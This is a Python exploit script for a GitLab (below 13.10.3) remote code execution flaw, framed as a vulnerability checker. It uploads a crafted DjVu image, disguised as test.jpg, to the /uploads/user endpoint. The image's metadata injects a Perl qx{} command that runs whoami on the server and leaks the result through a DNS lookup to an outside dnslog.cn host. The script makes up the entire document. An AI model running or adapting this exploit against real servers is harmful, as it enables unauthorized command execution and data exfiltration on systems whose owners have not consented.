import requests,argparse,re

def check(target_url):
	session = requests.Session()
	flag = 'Failed to process image'
	dns = '`whoami`.2oi2n4.dnslog.cn' 
	data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{"+  dns +"} . \\\n\" b \") )                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"

	p = '<meta name="csrf-token" content="(.*)" />'

	try:
		req1 = session.get(target_url.strip("/") + "/users/sign_in", verify=False)
		token = re.search(p,req1.text).group(1)

		headers = {
    		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
			"Connection": "close",
			"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
			"X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}

		req2 = session.post(target_url.strip("/") + "/uploads/user", data=data, headers=headers, verify=False)

		if flag in req2.text:
			print("[+] the target {} is vulnerable".format(target_url))
		else:
			print("[-] the target {} is not vulnerable".format(target_url))
	except Exception as e:
		print(e)

def main():
    parser = argparse.ArgumentParser(description='GitLab < 13.10.3 RCE')
    parser.add_argument('-u', '--url', type=str, help=' target URL ')

    args = parser.parse_args()

    target_url   = args.url

    check(target_url)

if __name__ == '__main__':
    main()